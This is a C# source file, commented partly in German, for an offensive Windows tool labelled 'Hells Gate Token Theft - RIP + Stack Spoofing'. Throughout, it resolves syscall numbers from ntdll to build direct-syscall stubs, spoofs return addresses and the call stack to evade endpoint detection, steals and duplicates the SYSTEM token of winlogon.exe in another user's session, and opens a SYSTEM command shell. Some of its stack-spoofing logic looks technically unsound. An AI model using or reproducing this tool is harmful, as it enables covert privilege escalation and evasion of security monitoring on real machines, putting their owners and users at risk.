using System;
using System.Collections.Generic;
using System.Diagnostics;
using System.IO;
using System.Runtime.InteropServices;
using System.Security.Principal;
using System.Text;
using System.Threading;

internal static class Program
{
    #region Native Strukturen

    [StructLayout(LayoutKind.Sequential)]
    public struct OBJECT_ATTRIBUTES
    {
        public int Length;
        public IntPtr RootDirectory;
        public IntPtr ObjectName;
        public uint Attributes;
        public IntPtr SecurityDescriptor;
        public IntPtr SecurityQualityOfService;

        public static OBJECT_ATTRIBUTES Create()
        {
            return new OBJECT_ATTRIBUTES
            {
                Length = Marshal.SizeOf(typeof(OBJECT_ATTRIBUTES))
            };
        }
    }

    [StructLayout(LayoutKind.Sequential)]
    public struct CLIENT_ID
    {
        public IntPtr UniqueProcess;
        public IntPtr UniqueThread;
    }

    [StructLayout(LayoutKind.Sequential, CharSet = CharSet.Unicode)]
    public struct STARTUPINFO
    {
        public uint cb;
        public string lpReserved;
        public string lpDesktop;
        public string lpTitle;
        public uint dwX, dwY, dwXSize, dwYSize;
        public uint dwXCountChars, dwYCountChars;
        public uint dwFillAttribute, dwFlags;
        public ushort wShowWindow;
        public ushort cbReserved2;
        public IntPtr lpReserved2;
        public IntPtr hStdInput, hStdOutput, hStdError;
    }

    [StructLayout(LayoutKind.Sequential)]
    public struct PROCESS_INFORMATION
    {
        public IntPtr hProcess;
        public IntPtr hThread;
        public uint dwProcessId;
        public uint dwThreadId;
    }

    [StructLayout(LayoutKind.Sequential)]
    public struct CONTEXT
    {
        public ulong P1Home, P2Home, P3Home, P4Home, P5Home, P6Home;
        public uint ContextFlags;
        public uint MxCsr;
        public ushort SegCs, SegDs, SegEs, SegFs, SegGs, SegSs;
        public uint EFlags;
        public ulong Dr0, Dr1, Dr2, Dr3, Dr6, Dr7;
        public ulong Rax, Rcx, Rdx, Rbx, Rsp, Rbp, Rsi, Rdi;
        public ulong R8, R9, R10, R11, R12, R13, R14, R15;
        public ulong Rip;
    }

    [StructLayout(LayoutKind.Sequential)]
    public struct WTS_SESSION_INFO
    {
        public int SessionId;
        [MarshalAs(UnmanagedType.LPStr)]
        public string pWinStationName;
        public int State;
    }

    #endregion

    #region Konstanten

    private const uint PROCESS_QUERY_LIMITED_INFORMATION = 0x1000;
    private const uint TOKEN_QUERY = 0x0008;
    private const uint TOKEN_DUPLICATE = 0x0002;
    private const uint TOKEN_IMPERSONATE = 0x0004;
    private const uint TOKEN_ALL_ACCESS = 0xF01FF;
    private const uint MEM_COMMIT = 0x1000;
    private const uint MEM_RESERVE = 0x2000;
    private const uint MEM_RELEASE = 0x8000;
    private const uint PAGE_EXECUTE_READWRITE = 0x40;
    private const uint PAGE_EXECUTE_READ = 0x20;
    private const uint PAGE_READWRITE = 0x04;
    private const uint CREATE_NEW_CONSOLE = 0x00000010;
    private const uint STARTF_USESHOWWINDOW = 0x00000001;
    private const short SW_SHOWNORMAL = 1;
    private const uint CONTEXT_FULL = 0x100007;
    private const int WTS_CURRENT_SERVER_HANDLE = 0;
    private const int WTS_ACTIVE = 0;

    #endregion

    #region Win32 API

    [DllImport("advapi32.dll", SetLastError = true)]
    static extern bool CreateProcessAsUser(IntPtr hToken, string lpApplicationName, string lpCommandLine,
        IntPtr lpProcessAttributes, IntPtr lpThreadAttributes, bool bInheritHandles,
        uint dwCreationFlags, IntPtr lpEnvironment, string lpCurrentDirectory,
        ref STARTUPINFO lpStartupInfo, out PROCESS_INFORMATION lpProcessInformation);

    [DllImport("advapi32.dll", SetLastError = true)]
    static extern bool ImpersonateLoggedOnUser(IntPtr hToken);

    [DllImport("advapi32.dll", SetLastError = true)]
    static extern bool RevertToSelf();

    [DllImport("kernel32.dll", SetLastError = true)]
    static extern IntPtr VirtualAlloc(IntPtr lpAddress, uint dwSize, uint flAllocationType, uint flProtect);

    [DllImport("kernel32.dll", SetLastError = true)]
    static extern bool VirtualFree(IntPtr lpAddress, uint dwSize, uint dwFreeType);

    [DllImport("kernel32.dll", SetLastError = true)]
    static extern bool CloseHandle(IntPtr hObject);

    [DllImport("kernel32.dll", SetLastError = true)]
    static extern IntPtr GetModuleHandle(string lpModuleName);

    [DllImport("kernel32.dll", SetLastError = true)]
    static extern IntPtr GetCurrentThread();

    [DllImport("ntdll.dll", SetLastError = true)]
    static extern int NtGetContextThread(IntPtr ThreadHandle, ref CONTEXT Context);

    [DllImport("ntdll.dll", SetLastError = true)]
    static extern int NtSetContextThread(IntPtr ThreadHandle, ref CONTEXT Context);

    [DllImport("ntdll.dll", SetLastError = true)]
    static extern int NtProtectVirtualMemory(IntPtr ProcessHandle, ref IntPtr BaseAddress,
        ref ulong RegionSize, uint NewProtect, out uint OldProtect);

    [DllImport("ntdll.dll", SetLastError = true)]
    static extern int NtFlushInstructionCache(IntPtr ProcessHandle, IntPtr BaseAddress, uint RegionSize);

    [DllImport("advapi32.dll")]
    static extern IntPtr GetSidSubAuthorityCount(IntPtr pSid);

    [DllImport("advapi32.dll")]
    static extern IntPtr GetSidSubAuthority(IntPtr pSid, uint nSubAuthority);

    [DllImport("advapi32.dll", SetLastError = true)]
    static extern bool SetTokenInformation(IntPtr hToken, int tokenInfoClass, ref int tokenInfo, uint tokenInfoLength);

    [DllImport("wtsapi32.dll", SetLastError = true)]
    static extern int WTSEnumerateSessions(IntPtr hServer, int Reserved, int Version, ref IntPtr ppSessionInfo, ref int pCount);

    [DllImport("wtsapi32.dll", SetLastError = true)]
    static extern void WTSFreeMemory(IntPtr pMemory);

    [DllImport("wtsapi32.dll", SetLastError = true)]
    static extern bool WTSQueryUserToken(int SessionId, out IntPtr phToken);

    #endregion

    #region Token Information

    private enum TOKEN_INFORMATION_CLASS
    {
        TokenElevation = 20,
        TokenSessionId = 12,
        TokenIntegrityLevel = 25
    }

    #endregion

    #region RIP-Spoofing & Call Stack Spoofing

    private static class SpoofingEngine
    {
        private static IntPtr _ntdllBase;
        private static IntPtr _syscallLandingPad;
        private static IntPtr _syntheticStack;
        private static int _stackDepth = 16;

        public static void Initialize()
        {
            _ntdllBase = GetModuleHandle("ntdll.dll");
            if (_ntdllBase == IntPtr.Zero)
            {
                Console.WriteLine("[Spoofing] Failed to get ntdll.dll base");
                return;
            }

            _syscallLandingPad = FindSyscallLandingPad();
            if (_syscallLandingPad != IntPtr.Zero)
                Console.WriteLine($"[Spoofing] Landing pad found at: 0x{_syscallLandingPad.ToInt64():X}");
            else
                Console.WriteLine("[Spoofing] No landing pad found");
        }

        private static IntPtr FindSyscallLandingPad()
        {
            try
            {
                byte[] ntdllCode = new byte[4096];
                Marshal.Copy(_ntdllBase, ntdllCode, 0, ntdllCode.Length);

                for (int i = 0; i < ntdllCode.Length - 3; i++)
                {
                    if (ntdllCode[i] == 0x0F && ntdllCode[i + 1] == 0x05 && ntdllCode[i + 2] == 0xC3)
                    {
                        return (IntPtr)((long)_ntdllBase + i);
                    }
                }
            }
            catch { }
            return IntPtr.Zero;
        }

        private static byte[] CreateSyntheticStack(IntPtr landingPad, int depth)
        {
            int frameSize = 16;
            byte[] stack = new byte[depth * frameSize];

            for (int i = 0; i < depth; i++)
            {
                byte[] retAddr = BitConverter.GetBytes((ulong)landingPad);
                Buffer.BlockCopy(retAddr, 0, stack, i * frameSize, 8);

                ulong nextRbp = (ulong)((depth - i - 1) * frameSize);
                byte[] rbpBytes = BitConverter.GetBytes(nextRbp);
                Buffer.BlockCopy(rbpBytes, 0, stack, i * frameSize + 8, 8);
            }

            return stack;
        }

        public static bool ApplyStackSpoofing()
        {
            if (_syscallLandingPad == IntPtr.Zero) return false;

            try
            {
                byte[] syntheticStack = CreateSyntheticStack(_syscallLandingPad, _stackDepth);
                _syntheticStack = VirtualAlloc(IntPtr.Zero, (uint)syntheticStack.Length,
                    MEM_COMMIT | MEM_RESERVE, PAGE_READWRITE);
                if (_syntheticStack == IntPtr.Zero) return false;

                Marshal.Copy(syntheticStack, 0, _syntheticStack, syntheticStack.Length);

                CONTEXT ctx = new CONTEXT();
                ctx.ContextFlags = CONTEXT_FULL;
                IntPtr hThread = GetCurrentThread();

                if (NtGetContextThread(hThread, ref ctx) != 0) return false;

                ulong originalRsp = ctx.Rsp;
                ulong originalRbp = ctx.Rbp;

                ctx.Rsp = (ulong)_syntheticStack + (ulong)((_stackDepth - 1) * 16);
                ctx.Rbp = ctx.Rsp - 8;

                if (NtSetContextThread(hThread, ref ctx) != 0) return false;

                Timer restoreTimer = null;
                restoreTimer = new Timer(_ =>
                {
                    try
                    {
                        CONTEXT restoreCtx = new CONTEXT();
                        restoreCtx.ContextFlags = CONTEXT_FULL;
                        NtGetContextThread(GetCurrentThread(), ref restoreCtx);
                        restoreCtx.Rsp = originalRsp;
                        restoreCtx.Rbp = originalRbp;
                        NtSetContextThread(GetCurrentThread(), ref restoreCtx);
                        VirtualFree(_syntheticStack, 0, MEM_RELEASE);
                        restoreTimer?.Dispose();
                    }
                    catch { }
                }, null, 5000, Timeout.Infinite);

                return true;
            }
            catch (Exception ex)
            {
                Console.WriteLine($"[Spoofing] Error: {ex.Message}");
                return false;
            }
        }

        public static byte[] CreateRipSpoofedStub(uint ssn)
        {
            if (_syscallLandingPad == IntPtr.Zero)
            {
                return new byte[]
                {
                    0xB8, (byte)ssn, (byte)(ssn >> 8), (byte)(ssn >> 16), (byte)(ssn >> 24),
                    0x4C, 0x8B, 0xD1,
                    0x0F, 0x05,
                    0xC3
                };
            }

            byte[] stub = new byte[]
            {
                0xB8, (byte)ssn, (byte)(ssn >> 8), (byte)(ssn >> 16), (byte)(ssn >> 24),
                0x4C, 0x8B, 0xD1,
                0x48, 0xB8, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
                0xFF, 0xE0,
            };

            byte[] addrBytes = BitConverter.GetBytes((long)_syscallLandingPad);
            Buffer.BlockCopy(addrBytes, 0, stub, 11, 8);

            return stub;
        }
    }

    #endregion

    #region Hells Gate mit RIP-Spoofing

    private static class HellsGateWithSpoofing
    {
        private static Dictionary<string, IntPtr> _syscallStubs = new Dictionary<string, IntPtr>();
        private static Dictionary<string, uint> _syscallSSNs = new Dictionary<string, uint>();

        public static uint ExtractSSN(string functionName)
        {
            try
            {
                string ntdllPath = Path.Combine(Environment.SystemDirectory, "ntdll.dll");
                byte[] peData = File.ReadAllBytes(ntdllPath);

                int e_lfanew = BitConverter.ToInt32(peData, 0x3C);
                if (e_lfanew <= 0 || e_lfanew + 256 >= peData.Length) return 0;

                int exportRVA = BitConverter.ToInt32(peData, e_lfanew + 0x88);
                if (exportRVA <= 0 || exportRVA + 256 >= peData.Length) return 0;

                int numberOfNames = BitConverter.ToInt32(peData, exportRVA + 0x18);
                int addressOfNames = BitConverter.ToInt32(peData, exportRVA + 0x20);
                int addressOfNameOrdinals = BitConverter.ToInt32(peData, exportRVA + 0x24);
                int addressOfFunctions = BitConverter.ToInt32(peData, exportRVA + 0x1C);

                for (int i = 0; i < numberOfNames && i < 10000; i++)
                {
                    int nameRVA = BitConverter.ToInt32(peData, addressOfNames + i * 4);
                    if (nameRVA <= 0 || nameRVA + 256 >= peData.Length) continue;

                    string name = ReadCString(peData, nameRVA);
                    if (string.IsNullOrEmpty(name)) continue;

                    if (name == functionName)
                    {
                        short ordinal = BitConverter.ToInt16(peData, addressOfNameOrdinals + i * 2);
                        int functionRVA = BitConverter.ToInt32(peData, addressOfFunctions + ordinal * 4);
                        if (functionRVA <= 0 || functionRVA + 32 >= peData.Length) return 0;

                        for (int j = 0; j < 32 && functionRVA + j + 4 < peData.Length; j++)
                        {
                            if (peData[functionRVA + j] == 0xB8)
                            {
                                uint ssn = BitConverter.ToUInt32(peData, functionRVA + j + 1);
                                Console.WriteLine($"[HellsGate] {functionName} -> SSN: 0x{ssn:X}");
                                return ssn;
                            }
                        }

                        if (functionRVA + 4 < peData.Length)
                        {
                            uint ssn = BitConverter.ToUInt32(peData, functionRVA + 4);
                            Console.WriteLine($"[HellsGate] {functionName} -> SSN: 0x{ssn:X} (fallback)");
                            return ssn;
                        }
                        break;
                    }
                }
            }
            catch (Exception ex)
            {
                Console.WriteLine($"[HellsGate] Error: {ex.Message}");
            }
            return 0;
        }

        private static string ReadCString(byte[] data, int offset)
        {
            int length = 0;
            while (offset + length < data.Length && data[offset + length] != 0 && length < 256)
                length++;
            return Encoding.ASCII.GetString(data, offset, length);
        }

        public static void RegisterSyscall(string name)
        {
            if (_syscallStubs.ContainsKey(name)) return;

            uint ssn = ExtractSSN(name);
            if (ssn == 0)
            {
                Console.WriteLine($"[HellsGate] Warning: Could not extract SSN for {name}");
                return;
            }

            _syscallSSNs[name] = ssn;
            byte[] stub = SpoofingEngine.CreateRipSpoofedStub(ssn);
            IntPtr stubAddr = VirtualAlloc(IntPtr.Zero, (uint)stub.Length, MEM_COMMIT | MEM_RESERVE, PAGE_EXECUTE_READWRITE);
            if (stubAddr == IntPtr.Zero) return;

            Marshal.Copy(stub, 0, stubAddr, stub.Length);

            ulong regionSize = (ulong)stub.Length;
            IntPtr baseAddr = stubAddr;
            NtProtectVirtualMemory((IntPtr)(-1), ref baseAddr, ref regionSize, PAGE_EXECUTE_READ, out _);
            NtFlushInstructionCache((IntPtr)(-1), stubAddr, (uint)stub.Length);

            _syscallStubs[name] = stubAddr;
        }

        public static T GetSyscall<T>(string name) where T : class
        {
            if (!_syscallStubs.ContainsKey(name))
                RegisterSyscall(name);

            if (_syscallStubs.ContainsKey(name))
                return Marshal.GetDelegateForFunctionPointer<T>(_syscallStubs[name]);

            return null;
        }

        public static void Cleanup()
        {
            foreach (var stub in _syscallStubs.Values)
            {
                VirtualFree(stub, 0, MEM_RELEASE);
            }
            _syscallStubs.Clear();
            _syscallSSNs.Clear();
        }
    }

    #endregion

    #region Syscall Delegates

    [UnmanagedFunctionPointer(CallingConvention.StdCall)]
    private delegate int NtOpenProcessDelegate(ref IntPtr ProcessHandle, uint DesiredAccess,
        ref OBJECT_ATTRIBUTES ObjectAttributes, ref CLIENT_ID ClientId);

    [UnmanagedFunctionPointer(CallingConvention.StdCall)]
    private delegate int NtOpenProcessTokenDelegate(IntPtr ProcessHandle, uint DesiredAccess, out IntPtr TokenHandle);

    [UnmanagedFunctionPointer(CallingConvention.StdCall)]
    private delegate int NtDuplicateTokenDelegate(IntPtr ExistingTokenHandle, uint DesiredAccess,
        ref OBJECT_ATTRIBUTES ObjectAttributes, bool EffectiveOnly, int TokenType, out IntPtr NewTokenHandle);

    [UnmanagedFunctionPointer(CallingConvention.StdCall)]
    private delegate int NtCloseDelegate(IntPtr Handle);

    [UnmanagedFunctionPointer(CallingConvention.StdCall)]
    private delegate int NtQueryInformationTokenDelegate(IntPtr TokenHandle, int TokenInformationClass,
        IntPtr TokenInformation, uint TokenInformationLength, out uint ReturnLength);

    #endregion

    #region Syscall Wrapper

    private static NtOpenProcessDelegate _ntOpenProcess;
    private static NtOpenProcessTokenDelegate _ntOpenProcessToken;
    private static NtDuplicateTokenDelegate _ntDuplicateToken;
    private static NtCloseDelegate _ntClose;
    private static NtQueryInformationTokenDelegate _ntQueryInfoToken;

    private static void InitializeSyscalls()
    {
        Console.WriteLine("[*] Initializing Hells Gate syscalls with RIP-Spoofing...");

        _ntOpenProcess = HellsGateWithSpoofing.GetSyscall<NtOpenProcessDelegate>("NtOpenProcess");
        _ntOpenProcessToken = HellsGateWithSpoofing.GetSyscall<NtOpenProcessTokenDelegate>("NtOpenProcessToken");
        _ntDuplicateToken = HellsGateWithSpoofing.GetSyscall<NtDuplicateTokenDelegate>("NtDuplicateToken");
        _ntClose = HellsGateWithSpoofing.GetSyscall<NtCloseDelegate>("NtClose");
        _ntQueryInfoToken = HellsGateWithSpoofing.GetSyscall<NtQueryInformationTokenDelegate>("NtQueryInformationToken");

        if (_ntOpenProcess == null) Console.WriteLine("[-] Failed to load NtOpenProcess");
        if (_ntOpenProcessToken == null) Console.WriteLine("[-] Failed to load NtOpenProcessToken");
        if (_ntDuplicateToken == null) Console.WriteLine("[-] Failed to load NtDuplicateToken");
        if (_ntClose == null) Console.WriteLine("[-] Failed to load NtClose");
        if (_ntQueryInfoToken == null) Console.WriteLine("[-] Failed to load NtQueryInformationToken");

        Console.WriteLine();
    }

    #endregion

    #region Session Management

    private static List<int> GetActiveSessions()
    {
        List<int> sessions = new List<int>();
        IntPtr ppSessionInfo = IntPtr.Zero;
        int sessionCount = 0;

        int result = WTSEnumerateSessions((IntPtr)WTS_CURRENT_SERVER_HANDLE, 0, 1, ref ppSessionInfo, ref sessionCount);

        if (result != 0)
        {
            IntPtr currentPtr = ppSessionInfo;
            for (int i = 0; i < sessionCount; i++)
            {
                WTS_SESSION_INFO sessionInfo = (WTS_SESSION_INFO)Marshal.PtrToStructure(currentPtr, typeof(WTS_SESSION_INFO));
                if (sessionInfo.State == WTS_ACTIVE)
                {
                    sessions.Add(sessionInfo.SessionId);
                }
                currentPtr = (IntPtr)((long)currentPtr + Marshal.SizeOf(typeof(WTS_SESSION_INFO)));
            }
            WTSFreeMemory(ppSessionInfo);
        }

        return sessions;
    }

    private static int GetCurrentSessionId()
    {
        return Process.GetCurrentProcess().SessionId;
    }

    private static uint FindWinlogonPidBySession(int sessionId)
    {
        try
        {
            var processes = Process.GetProcessesByName("winlogon");
            foreach (var proc in processes)
            {
                if (proc.SessionId == sessionId)
                {
                    return (uint)proc.Id;
                }
            }
        }
        catch { }
        return 0;
    }

    #endregion

    #region Token Helper

    private static int GetTokenSessionId(IntPtr hToken)
    {
        if (_ntQueryInfoToken == null) return -1;

        uint dwLen = 0;
        int status = _ntQueryInfoToken(hToken, (int)TOKEN_INFORMATION_CLASS.TokenSessionId,
            IntPtr.Zero, 0, out dwLen);
        if (status == 0 && dwLen > 0)
        {
            IntPtr pSessionId = Marshal.AllocHGlobal((int)dwLen);
            try
            {
                status = _ntQueryInfoToken(hToken, (int)TOKEN_INFORMATION_CLASS.TokenSessionId,
                    pSessionId, dwLen, out dwLen);
                if (status == 0)
                    return Marshal.ReadInt32(pSessionId);
            }
            finally { Marshal.FreeHGlobal(pSessionId); }
        }
        return -1;
    }

    private static bool IsTokenElevated(IntPtr hToken)
    {
        if (_ntQueryInfoToken == null) return false;

        uint dwLen = 0;
        int status = _ntQueryInfoToken(hToken, (int)TOKEN_INFORMATION_CLASS.TokenElevation,
            IntPtr.Zero, 0, out dwLen);
        if (status == 0 && dwLen > 0)
        {
            IntPtr pElev = Marshal.AllocHGlobal((int)dwLen);
            try
            {
                status = _ntQueryInfoToken(hToken, (int)TOKEN_INFORMATION_CLASS.TokenElevation,
                    pElev, dwLen, out dwLen);
                if (status == 0)
                    return Marshal.ReadInt32(pElev) != 0;
            }
            finally { Marshal.FreeHGlobal(pElev); }
        }
        return false;
    }

    private static uint GetTokenIntegrityLevel(IntPtr hToken)
    {
        if (_ntQueryInfoToken == null) return 0;

        uint dwLen = 0;
        int status = _ntQueryInfoToken(hToken, (int)TOKEN_INFORMATION_CLASS.TokenIntegrityLevel,
            IntPtr.Zero, 0, out dwLen);
        if (status == 0 && dwLen > 0)
        {
            IntPtr pTIL = Marshal.AllocHGlobal((int)dwLen);
            try
            {
                status = _ntQueryInfoToken(hToken, (int)TOKEN_INFORMATION_CLASS.TokenIntegrityLevel,
                    pTIL, dwLen, out dwLen);
                if (status == 0)
                {
                    IntPtr pSid = Marshal.ReadIntPtr(pTIL);
                    IntPtr pCount = GetSidSubAuthorityCount(pSid);
                    if (pCount != IntPtr.Zero)
                    {
                        byte count = Marshal.ReadByte(pCount);
                        IntPtr pLevel = GetSidSubAuthority(pSid, (uint)(count - 1));
                        if (pLevel != IntPtr.Zero)
                            return (uint)Marshal.ReadInt32(pLevel);
                    }
                }
            }
            finally { Marshal.FreeHGlobal(pTIL); }
        }
        return 0;
    }

    private static bool SetTokenSessionId(IntPtr hToken, int sessionId)
    {
        return SetTokenInformation(hToken, (int)TOKEN_INFORMATION_CLASS.TokenSessionId, ref sessionId, (uint)sizeof(int));
    }

    #endregion

    #region Main

    public static void Main()
    {
        Console.WriteLine("[*] ===============================================");
        Console.WriteLine("[*] Hells Gate Token Theft - RIP + Stack Spoofing");
        Console.WriteLine("[*] Multi-Session Edition");
        Console.WriteLine("[*] ===============================================");
        Console.WriteLine();

        // 1. Spoofing Engine initialisieren
        SpoofingEngine.Initialize();

        // 2. Stack Spoofing anwenden
        Console.WriteLine("[*] Applying stack spoofing...");
        SpoofingEngine.ApplyStackSpoofing();
        Console.WriteLine();

        // 3. Hells Gate Syscalls initialisieren (mit RIP-Spoofing)
        InitializeSyscalls();

        // 4. Administrator prüfen
        var currentIdentity = WindowsIdentity.GetCurrent();
        bool isAdmin = new WindowsPrincipal(currentIdentity).IsInRole(WindowsBuiltInRole.Administrator);
        Console.WriteLine($"[*] Current User: {currentIdentity.Name}");
        Console.WriteLine($"[*] Admin Rights: {isAdmin}");

        if (!isAdmin)
        {
            Console.WriteLine("[-] This tool requires Administrator privileges!");
            Console.ReadKey();
            return;
        }
        Console.WriteLine();

        // 5. Aktive Sessions finden
        int currentSession = GetCurrentSessionId();
        var activeSessions = GetActiveSessions();

        Console.WriteLine($"[*] Current Session ID: {currentSession}");
        Console.WriteLine($"[*] Active Sessions: {string.Join(", ", activeSessions)}");

        // 6. Ziel-Session finden (eine andere als die aktuelle)
        int targetSession = -1;
        foreach (int session in activeSessions)
        {
            if (session != currentSession)
            {
                targetSession = session;
                break;
            }
        }

        if (targetSession == -1)
        {
            Console.WriteLine("\n[-] ===============================================");
            Console.WriteLine("[-] No other active session found!");
            Console.WriteLine("[-] ===============================================");
            Console.WriteLine("[*] Please do one of the following:");
            Console.WriteLine("[*]   1. Press Windows+L -> Benutzer wechseln");
            Console.WriteLine("[*]   2. Log in with a second user account");
            Console.WriteLine("[*]   3. Run the tool again after switching users");
            Console.WriteLine();
            Console.WriteLine("[*] Press any key to exit...");
            Console.ReadLine();
            return;
        }

        Console.WriteLine($"[+] Target Session (different from yours): {targetSession}");
        Console.WriteLine();

        // 7. Winlogon in der Ziel-Session finden
        Console.WriteLine($"[*] Searching for winlogon.exe in Session {targetSession}...");
        uint winlogonPid = FindWinlogonPidBySession(targetSession);

        if (winlogonPid == 0)
        {
            Console.WriteLine($"[-] Could not find winlogon.exe in Session {targetSession}!");
            Console.ReadKey();
            return;
        }
        Console.WriteLine($"[+] Found winlogon.exe with PID: {winlogonPid} (Session: {targetSession})");
        Console.WriteLine();

        try
        {
            // 8. winlogon.exe Prozess öffnen
            Console.WriteLine("[*] Opening winlogon.exe...");
            OBJECT_ATTRIBUTES objAttr = OBJECT_ATTRIBUTES.Create();
            CLIENT_ID clientId = new CLIENT_ID();
            clientId.UniqueProcess = (IntPtr)winlogonPid;
            clientId.UniqueThread = IntPtr.Zero;

            IntPtr hProcess = IntPtr.Zero;
            int status = _ntOpenProcess(ref hProcess, PROCESS_QUERY_LIMITED_INFORMATION, ref objAttr, ref clientId);

            if (status != 0 || hProcess == IntPtr.Zero)
            {
                Console.WriteLine($"[-] NtOpenProcess failed: 0x{status:X8}");
                Console.ReadKey();
                return;
            }
            Console.WriteLine($"[+] Process opened (Handle: 0x{hProcess.ToInt64():X})");

            // 9. Token aus winlogon.exe öffnen
            Console.WriteLine("[*] Opening token...");
            IntPtr hToken = IntPtr.Zero;
            status = _ntOpenProcessToken(hProcess, TOKEN_QUERY | TOKEN_DUPLICATE | TOKEN_IMPERSONATE, out hToken);

            if (status != 0 || hToken == IntPtr.Zero)
            {
                Console.WriteLine($"[-] NtOpenProcessToken failed: 0x{status:X8}");
                _ntClose(hProcess);
                Console.ReadKey();
                return;
            }
            Console.WriteLine($"[+] Token opened (Handle: 0x{hToken.ToInt64():X})");

            // 10. Originale Token Info anzeigen
            try
            {
                bool isElevated = IsTokenElevated(hToken);
                int session = GetTokenSessionId(hToken);
                uint integrity = GetTokenIntegrityLevel(hToken);

                Console.WriteLine($"[+] Original Token Info:");
                Console.WriteLine($"    - Elevated: {isElevated}");
                Console.WriteLine($"    - Session: {session}");
                Console.WriteLine($"    - Integrity: 0x{integrity:X}");
            }
            catch (Exception ex)
            {
                Console.WriteLine($"[!] Could not read token info: {ex.Message}");
            }
            Console.WriteLine();

            // 11. Token duplizieren
            Console.WriteLine("[*] Duplicating token...");
            OBJECT_ATTRIBUTES dupAttr = OBJECT_ATTRIBUTES.Create();
            IntPtr hDupToken = IntPtr.Zero;
            status = _ntDuplicateToken(hToken, TOKEN_ALL_ACCESS, ref dupAttr, false, 1, out hDupToken);

            if (status != 0 || hDupToken == IntPtr.Zero)
            {
                Console.WriteLine($"[-] NtDuplicateToken failed: 0x{status:X8}");
                Console.WriteLine("[*] Using original token...");
                hDupToken = hToken;
                hToken = IntPtr.Zero;
            }
            else
            {
                Console.WriteLine($"[+] Token duplicated (Handle: 0x{hDupToken.ToInt64():X})");
            }

            // 12. Session ID im duplizierten Token auf die Ziel-Session setzen
            if (SetTokenSessionId(hDupToken, targetSession))
            {
                Console.WriteLine($"[+] Token Session ID set to: {targetSession}");
            }
            else
            {
                Console.WriteLine($"[-] Could not set Token Session ID (Error: {Marshal.GetLastWin32Error()})");
            }
            Console.WriteLine();

            // 13. cmd.exe mit SYSTEM Rechten starten
            Console.WriteLine("[*] ===============================================");
            Console.WriteLine("[*] Starting cmd.exe with SYSTEM token...");
            Console.WriteLine();

            bool processCreated = false;

            // Methode 1: CreateProcessAsUser (Primary)
            Console.WriteLine("[*] Using CreateProcessAsUser...");

            STARTUPINFO si = new STARTUPINFO();
            si.cb = (uint)Marshal.SizeOf(typeof(STARTUPINFO));
            si.dwFlags = STARTF_USESHOWWINDOW;
            si.wShowWindow = (ushort)SW_SHOWNORMAL;
            si.lpDesktop = "winsta0\\default";

            PROCESS_INFORMATION pi = new PROCESS_INFORMATION();

            bool success = CreateProcessAsUser(
                hDupToken,
                null,
                "cmd.exe",
                IntPtr.Zero,
                IntPtr.Zero,
                false,
                CREATE_NEW_CONSOLE,
                IntPtr.Zero,
                null,
                ref si,
                out pi);

            if (success)
            {
                Console.WriteLine($"[+] SUCCESS! cmd.exe started with PID: {pi.dwProcessId}");
                processCreated = true;
                CloseHandle(pi.hThread);
                CloseHandle(pi.hProcess);
            }
            else
            {
                int lastError = Marshal.GetLastWin32Error();
                Console.WriteLine($"[-] CreateProcessAsUser failed: {lastError}");

                // Methode 2: ImpersonateLoggedOnUser + Process.Start (Fallback)
                Console.WriteLine("[*] Trying ImpersonateLoggedOnUser fallback...");

                if (ImpersonateLoggedOnUser(hDupToken))
                {
                    Console.WriteLine("[+] Impersonation successful!");
                    try
                    {
                        Process.Start("cmd.exe");
                        Console.WriteLine("[+] SUCCESS! cmd.exe started with SYSTEM privileges!");
                        processCreated = true;
                    }
                    catch (Exception ex)
                    {
                        Console.WriteLine($"[-] Process.Start failed: {ex.Message}");
                    }
                    finally
                    {
                        RevertToSelf();
                    }
                }
                else
                {
                    Console.WriteLine($"[-] Impersonation failed: {Marshal.GetLastWin32Error()}");
                }
            }

            if (processCreated)
            {
                Console.WriteLine();
                Console.WriteLine("[+] ===============================================");
                Console.WriteLine("[+] !!! SUCCESS !!!");
                Console.WriteLine($"[+] A new cmd.exe is running with SYSTEM privileges!");
                Console.WriteLine($"[+] Target Session: {targetSession}");
                Console.WriteLine("[+] ===============================================");
            }
            else
            {
                Console.WriteLine();
                Console.WriteLine("[-] ===============================================");
                Console.WriteLine("[-] Could not create process with SYSTEM token.");
                Console.WriteLine("[-] ===============================================");
                Console.WriteLine("[*] Possible reasons:");
                Console.WriteLine("[*]   - The token is still invalid for interactive use");
                Console.WriteLine("[*]   - UAC or other security features are blocking");
                Console.WriteLine("[*]   - Try running as SYSTEM or TrustedInstaller");
                Console.WriteLine();
                Console.WriteLine($"[*] Token handle: 0x{hDupToken.ToInt64():X}");
                Console.WriteLine($"[*] You can manually use this token with tools like:");
                Console.WriteLine("[*]   - RunAsUser.exe or PsExec.exe");
            }

            // Cleanup
            if (hDupToken != IntPtr.Zero && hDupToken != hToken)
                _ntClose(hDupToken);
            if (hToken != IntPtr.Zero)
                _ntClose(hToken);
            if (hProcess != IntPtr.Zero)
                _ntClose(hProcess);
        }
        catch (Exception ex)
        {
            Console.WriteLine($"[-] Error: {ex.Message}");
            Console.WriteLine(ex.StackTrace);
        }

        Console.WriteLine();
        Console.WriteLine("[*] Press any key to exit...");
        Console.ReadLine();

        HellsGateWithSpoofing.Cleanup();
    }

    #endregion
}